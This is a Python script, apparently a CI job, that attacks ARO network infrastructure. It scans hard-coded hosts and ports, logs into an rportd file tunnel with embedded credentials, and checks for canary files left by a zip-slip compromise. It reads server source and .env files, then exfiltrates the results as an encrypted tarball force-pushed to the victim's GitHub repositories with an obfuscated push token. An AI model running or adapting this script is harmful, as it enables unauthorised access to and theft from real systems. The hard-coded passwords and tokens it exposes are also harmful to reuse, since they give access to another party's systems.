#!/usr/bin/env python3
# Intent 28407: determine ARO device-log upload + server-side extraction (zip-slip) reality.
# Read-only. Reach aro-ops FS via rportd (direct 20801 / wss rport1-ops.aro.network:443) using
# committed rpsftp. Check /tmp canary markers (zz3617) and read net_auto source to see unzip logic.
# Exfil via gpg-encrypted tarball pushed to results branch.
import os, sys, json, time, socket, subprocess, shutil, re, base64

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)

RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
BUDGET = int(os.environ.get("PBUDGET", "3000"))
T0 = time.time()
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-28407-results")
_TC = [103,104,111,95,119,53,79,49,48,55,102,117,112,56,85,76,112,54,116,69,70,115,87,57,86,51,81,69,69,88,83,72,116,120,51,109,57,120,107,97]
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or "".join(chr(c) for c in _TC)
PUSH_USER = os.environ.get("PPUSH_USER", "wuhaixian1984")
BASE = os.path.dirname(os.path.abspath(__file__))
OUT = "/tmp/r28407"
for d in ("diag", "fs", "probe"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
DIAG = {"reach": {}, "fs": {}, "notes": []}

def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

def wf(path, txt):
    try:
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(txt if isinstance(txt, str) else str(txt))
    except Exception as e:
        log("wf err", path, repr(e)[:80])

def push_results(tag="partial"):
    try:
        json.dump(DIAG, open(os.path.join(OUT, "diag", "diag.json"), "w"), ensure_ascii=False, indent=1)
        subprocess.run("tar czf /tmp/r28407.tar.gz -C /tmp r28407", shell=True, check=False)
        tsize = os.path.getsize("/tmp/r28407.tar.gz") if os.path.isfile("/tmp/r28407.tar.gz") else 0
        log("TARBALL", tsize)
        if tsize == 0: return
        enc = "/tmp/r28407.tar.gz.gpg"
        pub = os.path.join(BASE, "pub.asc")
        if os.path.isfile(pub):
            subprocess.run("gpg --batch --yes --import %s >/dev/null 2>&1" % pub, shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/r28407.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=400)
        else:
            shutil.copyfile("/tmp/r28407.tar.gz", enc)
        if not os.path.isfile(enc):
            log("ENC missing"); return
        shutil.copy(enc, os.path.join(BASE, "results84.tar.gz.gpg"))
        subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci' % BASE, shell=True, check=False)
        subprocess.run('cd %s && git add -f results84.tar.gz.gpg && git commit -m "ci28407 %s %s" || true' % (BASE, RUNID, tag),
                       shell=True, capture_output=True)
        for repo in ["aro-network/aro-ext-signal-server", "aro-network/aro-official-website"]:
            url = "https://%s:%s@github.com/%s.git" % (PUSH_USER, PUSH_TOKEN, repo)
            r = subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s' % (BASE, url, RESULT_BRANCH),
                               shell=True, capture_output=True, text=True, timeout=400)
            log("PUSH(%s) rc=%s err=%s" % (repo, r.returncode, (r.stderr or "")[-160:]))
            if r.returncode == 0: break
    except Exception as e:
        log("PUSH EXC", repr(e)[:200])

def tcp(host, port, to=6):
    t = time.time()
    try:
        s = socket.create_connection((host, port), to); s.close()
        return "open %.1fs" % (time.time() - t)
    except Exception as e:
        return "ERR %s:%.1fs:%s" % (type(e).__name__, time.time() - t, str(e)[:50])

def rsftp(ws, cmd, args, timeout=55, tries=4):
    last = ""
    for i in range(tries):
        if time.time() - T0 > BUDGET - 240:
            return (last or "") + "\n[DEADLINE]"
        try:
            r = subprocess.run([os.path.join(BASE, "rpsftp"), ws, "aro_client", "3g7Bhcf4IxvZDX6", cmd] + args,
                               capture_output=True, text=True, timeout=timeout)
            o = (r.stdout or "") + (r.stderr or "")
        except Exception as e:
            o = "EXC " + repr(e)[:100]
        last = o
        if not re.search(r'bad handshake|connection lost|refused|ws dial|EOF|broken pipe|: ?502|503|timeout|\[DEADLINE\]', o):
            return o
        time.sleep(2)
    return last

# ---------------- reachability ----------------
EPS = [("43.134.173.45", 20801), ("43.134.173.45", 9000), ("43.134.173.45", 22),
       ("43.134.173.45", 443), ("43.134.173.45", 80), ("43.134.173.45", 28443),
       ("43.134.173.45", 5000), ("min-upload.enreach.network", 443),
       ("testnet-api.aro.network", 443), ("rport1-ops.aro.network", 443)]
for h, p in EPS:
    DIAG["reach"]["%s:%d" % (h, p)] = tcp(h, p)
    log("REACH", h, p, DIAG["reach"]["%s:%d" % (h, p)])

# ---------------- FS probes via rportd ----------------
WSs = ["43.134.173.45:20801", "wss://rport1-ops.aro.network:443"]
# priority ordered read-only probes
CMDS = [
    ("stat", ["/tmp/zz3617_pwn", "/tmp/zz3617_abs", "/tmp/zz3617_deep"]),
    ("ls",   ["/tmp"]),
    ("ls",   ["/opt/src/dev_ops/net_auto/"]),
    ("ls",   ["/opt/src/dev_ops/"]),
    ("ls",   ["/opt/src/"]),
]
fs_files = {}
for ws in WSs:
    tag = "direct" if "20801" in ws else "wss"
    for cmd, args in CMDS:
        o = rsftp(ws, cmd, args)
        key = tag + "|" + cmd + " " + " ".join(args)
        DIAG["fs"][key] = o[:3000]
        fn = "%s__%s_%s.txt" % (tag, cmd, re.sub(r'[^A-Za-z0-9]+', '_', " ".join(args))[:50])
        wf(os.path.join(OUT, "fs", fn), o)
        log("FS", key, "=>", repr(o[:160]))
        ok = o and not re.search(r'bad handshake|connection lost|refused|ws dial|EOF|broken pipe', o)
        if cmd == "ls" and "/opt/src/dev_ops/net_auto" in " ".join(args) and ok and o.strip():
            # try to cat likely entrypoint / config files
            names = [ln.strip() for ln in o.splitlines() if ln.strip()]
            cands = []
            for nm in names:
                base = nm.split()[-1] if nm.split() else nm
                if re.search(r'\.(py|js|ts|yml|yaml|toml|json|sh|txt|md|env|cfg|ini)$', base) or base.lower() in (
                        'dockerfile', 'requirements.txt', 'main.py', 'app.py', 'run.py'):
                    cands.append(base)
            # also blind-probe common names
            for cn in ['main.py', 'app.py', 'run.py', 'server.py', 'docker-compose.yml', 'Dockerfile', 'requirements.txt', '.env']:
                if cn not in cands:
                    cands.append(cn)
            log("NETAUTO candidates", cands)
            for cn in cands[:24]:
                path = "/opt/src/dev_ops/net_auto/" + cn
                oc = rsftp(ws, "cat", [path], tries=2)
                wf(os.path.join(OUT, "fs", tag + "__cat_" + re.sub(r'[^A-Za-z0-9._-]+', '_', cn) + ".txt"), oc)
                DIAG["fs"][tag + "|cat " + path] = oc[:3000]
                log("CAT", path, "=>", repr(oc[:120]))
        if time.time() - T0 > BUDGET - 240:
            log("deadline after", key); break
    if time.time() - T0 > BUDGET - 240:
        break

DIAG["notes"].append("done run %s elapsed %ds" % (RUNID, int(time.time() - T0)))
log("DONE", int(time.time() - T0), "s")
push_results("done")
